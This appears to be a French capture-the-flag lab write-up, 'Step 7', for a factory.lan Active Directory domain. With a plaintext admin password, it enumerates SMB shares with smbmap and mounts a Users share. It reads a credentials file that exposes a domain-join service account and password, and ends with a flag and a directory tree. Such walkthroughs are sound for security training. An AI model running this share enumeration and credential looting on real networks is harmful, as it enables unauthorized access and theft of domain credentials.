# Step 7

## lister les shares accessibles avec les creds

> factory.lan / adminServer : #3LLe!!estOuL@Poulette

```bash
python /opt/t/pentest/recona/smbmap/smbmap.py -u adminServer -p '#3LLe!!estOuL@Poulette' -d 'factory.lan' -H 172.16.42.101

[+] Finding open SMB ports....
[+] User SMB session establishd on 172.16.42.101...
[+] IP: 172.16.42.101:445	Name: 172.16.42.101                                     
	Disk                                                  	Permissions
	----                                                  	-----------
	ADMIN$                                            	NO ACCESS
	C$                                                	NO ACCESS
	IPC$                                              	READ ONLY
	Users                                             	NO ACCESS

python /opt/t/pentest/recona/smbmap/smbmap.py -u adminServer -p '#3LLe!!estOuL@Poulette' -d 'factory.lan' -H 172.16.42.5 

[+] Finding open SMB ports....
[+] User SMB session establishd on 172.16.42.5...
[+] IP: 172.16.42.5:445	Name: 172.16.42.5                                       
	Disk                                                  	Permissions
	----                                                  	-----------
	ADMIN$                                            	NO ACCESS
	C$                                                	NO ACCESS
	IPC$                                              	READ ONLY
	NETLOGON                                          	READ ONLY
	provisioning                                      	READ ONLY
	SYSVOL                                            	READ ONLY
	Users                                             	READ ONLY

```

## monter le partage Users

```bash
mkdir local_users
sudo mount -t cifs -o username=adminServer,password='#3LLe!!estOuL@Poulette' //172.16.42.5/Users local_users
```

le tree, cf (tree users)[#treeUsers]
dans provisioning t'as que les creds et le flag

## Loot

```bash
cat local_users/Administrator/Documents/provisioning/credentials.txt

#####
## Provisioning Account
####

This account is used only for joining machines (servers & workstations) to domain.
We created it to "delegate" this right to servers and workstations admins since we have disabled
this right for regular users and we do not want to give domain admin rights to
servers administrators and workstation administrators.

factory.lan\SvcJoinComputerToDom
QueStC3qU!esTpetItEtMarr0N?
```

## Flag

> 5FFECA75938FA8E5D7FCB436451DA1BC4713DCD94DD6F57F2DF50E035039AB0C

## treeUsers

```bash
(CrackMapExec) ➜  local_users tree . 
.
├── Administrator
│   └── Documents
│       └── provisioning
│           ├── credentials.txt
│           └── flag-07.txt
├── Default
│   ├── AppData
│   │   ├── Local
│   │   │   ├── Microsoft
│   │   │   │   ├── InputPersonalization
│   │   │   │   │   └── TrainedDataStore
│   │   │   │   ├── Windows
│   │   │   │   │   ├── CloudStore
│   │   │   │   │   ├── GameExplorer
│   │   │   │   │   ├── History
│   │   │   │   │   ├── INetCache
│   │   │   │   │   ├── INetCookies
│   │   │   │   │   ├── Shell
│   │   │   │   │   │   └── DefaultLayouts.xml
│   │   │   │   │   └── WinX
│   │   │   │   │       ├── Group1
│   │   │   │   │       │   ├── 1 - Desktop.lnk
│   │   │   │   │       │   └── desktop.ini
│   │   │   │   │       ├── Group2
│   │   │   │   │       │   ├── 1 - Run.lnk
│   │   │   │   │       │   ├── 2 - Search.lnk
│   │   │   │   │       │   ├── 3 - Windows Explorer.lnk
│   │   │   │   │       │   ├── 4 - Control Panel.lnk
│   │   │   │   │       │   ├── 5 - Task Manager.lnk
│   │   │   │   │       │   └── desktop.ini
│   │   │   │   │       └── Group3
│   │   │   │   │           ├── 01a - Windows PowerShell.lnk
│   │   │   │   │           ├── 01 - Command Prompt.lnk
│   │   │   │   │           ├── 02a - Windows PowerShell.lnk
│   │   │   │   │           ├── 02 - Command Prompt.lnk
│   │   │   │   │           ├── 03 - Computer Management.lnk
│   │   │   │   │           ├── 04-1 - NetworkStatus.lnk
│   │   │   │   │           ├── 04 - Disk Management.lnk
│   │   │   │   │           ├── 05 - Device Manager.lnk
│   │   │   │   │           ├── 06 - SystemAbout.lnk
│   │   │   │   │           ├── 07 - Event Viewer.lnk
│   │   │   │   │           ├── 08 - PowerAndSleep.lnk
│   │   │   │   │           ├── 09 - Mobility Center.lnk
│   │   │   │   │           ├── 10 - AppsAndFeatures.lnk
│   │   │   │   │           └── desktop.ini
│   │   │   │   ├── WindowsApps
│   │   │   │   └── Windows Sidebar
│   │   │   │       ├── Gadgets
│   │   │   │       └── settings.ini
│   │   │   └── Temp
│   │   └── Roaming
│   │       └── Microsoft
│   │           ├── Internet Explorer
│   │           │   └── Quick Launch
│   │           │       ├── Control Panel.lnk
│   │           │       ├── desktop.ini
│   │           │       ├── Server Manager.lnk
│   │           │       ├── Shows Desktop.lnk
│   │           │       └── Window Switcher.lnk
│   │           └── Windows
│   │               ├── CloudStore
│   │               ├── Network Shortcuts
│   │               ├── Printer Shortcuts
│   │               ├── Recent
│   │               ├── SendTo
│   │               │   ├── Compressed (zipped) Folder.ZFSendToTarget
│   │               │   ├── Desktop (create shortcut).DeskLink
│   │               │   ├── Desktop.ini
│   │               │   └── Mail Recipient.MAPIMail
│   │               ├── Start Menu
│   │               │   └── Programs
│   │               │       ├── Accessibility
│   │               │       │   ├── Desktop.ini
│   │               │       │   ├── Magnify.lnk
│   │               │       │   ├── Narrator.lnk
│   │               │       │   └── On-Screen Keyboard.lnk
│   │               │       ├── Accessories
│   │               │       │   ├── desktop.ini
│   │               │       │   └── Notepad.lnk
│   │               │       ├── Maintenance
│   │               │       │   └── Desktop.ini
│   │               │       ├── System Tools
│   │               │       │   ├── Administrative Tools.lnk
│   │               │       │   ├── Command Prompt.lnk
│   │               │       │   ├── computer.lnk
│   │               │       │   ├── Control Panel.lnk
│   │               │       │   ├── Desktop.ini
│   │               │       │   ├── File Explorer.lnk
│   │               │       │   └── Run.lnk
│   │               │       └── Windows PowerShell
│   │               │           ├── desktop.ini
│   │               │           ├── Windows PowerShell ISE.lnk
│   │               │           ├── Windows PowerShell ISE (x86).lnk
│   │               │           ├── Windows PowerShell.lnk
│   │               │           └── Windows PowerShell (x86).lnk
│   │               └── Templates
│   ├── Desktop
│   ├── Documents
│   ├── Downloads
│   ├── Favorites
│   ├── Links
│   ├── Music
│   ├── NTUSER.DAT
│   ├── NTUSER.DAT{1c3790b4-b8ad-11e8-aa21-e41d2d101530}.TM.blf
│   ├── NTUSER.DAT{1c3790b4-b8ad-11e8-aa21-e41d2d101530}.TMContainer00000000000000000001.regtrans-ms
│   ├── NTUSER.DAT{1c3790b4-b8ad-11e8-aa21-e41d2d101530}.TMContainer00000000000000000002.regtrans-ms
│   ├── NTUSER.DAT.LOG1
│   ├── NTUSER.DAT.LOG2
│   ├── Pictures
│   ├── Saved Games
│   └── Videos
└── desktop.ini
```